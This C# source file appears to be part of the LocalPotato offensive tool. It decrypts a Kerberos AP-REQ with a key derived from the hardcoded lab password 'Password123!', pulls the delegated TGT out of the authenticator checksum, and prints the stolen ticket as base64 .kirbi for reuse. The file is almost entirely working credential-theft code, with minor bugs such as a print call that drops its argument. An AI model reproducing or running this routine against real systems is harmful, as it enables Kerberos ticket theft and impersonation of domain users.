using System;
using Asn1;
using Rubeus;
using NtApiDotNet.Win32.Security.Authentication.Kerberos;
using System.Linq;

namespace LocalPotato
{ 
    public class parseToken
    {
        //parseToken.parse(ticket, "http/win2016.htb.local");
        public static void parse(byte[] ClientTokenArray, string targetSPN)
        {
            byte[] finalTGTBytes = new byte[] { };
            bool display = true;
            byte[] KeberosV5 = { 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x12, 0x01, 0x02, 0x02 }; // 1.2.840.113554.1.2.2
            var index = Helpers.SearchBytePattern(KeberosV5, ClientTokenArray);

            KerberosAPRequestAuthenticationToken token = (KerberosAPRequestAuthenticationToken)KerberosAuthenticationToken.Parse(ClientTokenArray);
            byte[] edata = token.Ticket.EncryptedData.CipherText;
            byte[] adata = token.Authenticator.CipherText;
            byte[] key = Crypto.KerberosPasswordHashh(Interop.KERB_ETYPE.rc4_hmac, "Password123!");
            
            byte[] decryptedTicket = Crypto.KerberosDecrypt(Interop.KERB_ETYPE.rc4_hmac, Rubeus.Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, key, edata);
            key = decryptedTicket.Skip(30).Take(16).ToArray();


            //return;
            if (index > 0)
            {
                var startIndex = index += KeberosV5.Length;

                // check if the first two bytes == TOK_ID_KRB_AP_REQ
                if ((ClientTokenArray[startIndex] == 1) && (ClientTokenArray[startIndex + 1] == 0))
                {
                    if (display)
                    {
                        Console.WriteLine("[*] Found the AP-REQ delegation ticket in the GSS-API output.");
                    }

                    startIndex += 2;
                    var apReqArray = new byte[ClientTokenArray.Length - startIndex];
                    Buffer.BlockCopy(ClientTokenArray, startIndex, apReqArray, 0, apReqArray.Length);

                    // decode the supplied bytes to an AsnElt object
                    //  false == ignore trailing garbage
                    var asn_AP_REQ = AsnElt.Decode(apReqArray, false);

                    //var tick = new Ticket(asn_AP_REQ);


                    foreach (var elt in asn_AP_REQ.Sub[0].Sub)
                    {
                        //https://github.com/GhostPack/Rubeus/blob/3620814cd2c5f05e87cddd50211197bd932fec51/Rubeus/lib/krb_structures/AP_REQ.cs#L61
                        if (elt.TagValue == 4)
                        {
                            // build the encrypted authenticator
                            var encAuthenticator = new EncryptedData(elt.Sub[0]);
                            var authenticatorEtype = (Interop.KERB_ETYPE)encAuthenticator.etype;
                            if (display)
                            {
                                Console.WriteLine("[*] Authenticator etype: {0}", authenticatorEtype);
                            }

                            if (key != null)
                            {
                                var base64SessionKey = Convert.ToBase64String(key);
                                if (display)
                                {
                                    Console.WriteLine("[*] Extracted the service ticket session key from the ticket cache: {0}", base64SessionKey);
                                }

                                // KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR = 11
                                var rawBytes = Crypto.KerberosDecrypt(authenticatorEtype, Interop.KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR, key, encAuthenticator.cipher);

                                var asnAuthenticator = AsnElt.Decode(rawBytes, false);

                                foreach (var elt2 in asnAuthenticator.Sub[0].Sub)
                                {
                                    if (elt2.TagValue == 3)
                                    {
                                        if (display)
                                        {
                                            Console.WriteLine("[+] Successfully decrypted the authenticator");
                                        }
                        
                                        var cksumtype = Convert.ToInt32(elt2.Sub[0].Sub[0].Sub[0].GetInteger());
                        
                                        // check if cksumtype == GSS_CHECKSUM_TYPE
                                        if (cksumtype == 0x8003)
                                        {
                                            var checksumBytes = elt2.Sub[0].Sub[1].Sub[0].GetOctetString();
                        
                                            // check if the flags include GSS_C_DELEG_FLAG
                                            if ((checksumBytes[20] & 1) == 1)
                                            {
                                                var dLen = BitConverter.ToUInt16(checksumBytes, 26);
                                                var krbCredBytes = new byte[dLen];
                                                // copy out the krbCredBytes from the checksum structure
                                                Buffer.BlockCopy(checksumBytes, 28, krbCredBytes, 0, dLen);
                        
                                                var asn_KRB_CRED = AsnElt.Decode(krbCredBytes, false);
                                                Ticket ticket = null;
                                                var cred = new KRB_CRED();
                        
                                                foreach (var elt3 in asn_KRB_CRED.Sub[0].Sub)
                                                {
                                                    if (elt3.TagValue == 2)
                                                    {
                                                        // extract the TGT and add it to the KRB-CRED
                                                        ticket = new Ticket(elt3.Sub[0].Sub[0].Sub[0]);
                                                        cred.tickets.Add(ticket);
                                                    }
                                                    else if (elt3.TagValue == 3)
                                                    {
                                                        var enc_part = elt3.Sub[0].Sub[1].GetOctetString();
                        
                                                        // KRB_KEY_USAGE_KRB_CRED_ENCRYPTED_PART = 14
                                                        var rawBytes2 = Crypto.KerberosDecrypt(authenticatorEtype, Interop.KRB_KEY_USAGE_KRB_CRED_ENCRYPTED_PART, key, enc_part);
                        
                                                        // decode the decrypted plaintext enc par and add it to our final cred object
                                                        var encKrbCredPartAsn = AsnElt.Decode(rawBytes2, false);
                                                        cred.enc_part.ticket_info.Add(new KrbCredInfo(encKrbCredPartAsn.Sub[0].Sub[0].Sub[0].Sub[0]));
                                                    }
                                                }
                        
                                                var kirbiBytes = cred.Encode().Encode();
                                                var kirbiString = Convert.ToBase64String(kirbiBytes);
                        
                                                if (true)
                                                {
                                                    Console.WriteLine("[*] base64(ticket.kirbi):\r\n", kirbiString);
                        
                                                    if (false)
                                                    {
                                                        // display the .kirbi base64, columns of 80 chararacters
                                                        foreach (var line in Helpers.Split(kirbiString, 80))
                                                        {
                                                            Console.WriteLine("      {0}", line);
                                                        }
                                                    }
                                                    else
                                                    {
                                                        Console.WriteLine("      {0}", kirbiString);
                                                    }
                                                }
                        
                                                finalTGTBytes = kirbiBytes;
                                            }
                                            else
                                            {
                                                Console.WriteLine("[X] cksumtype is not GSS_C_DELEG_FLAG", cksumtype);
                                            }
                                        }
                                        else
                                        {
                                            Console.WriteLine("[X] Error: Invalid checksum type: {0}", cksumtype);
                                        }
                                    }
                                }
                            }
                            else
                            {
                                Console.WriteLine("[X] Error: Unable to extract session key from cache for target SPN: {0}", targetSPN);
                            }
                        }
                    }
                }
                else
                {
                    Console.WriteLine("[X] Error: Kerberos OID not found in output buffer!");
                }
            }
            else
            {
                Console.WriteLine("[X] Error: Kerberos OID not found in output buffer!");
            }
        }
        
    }
}
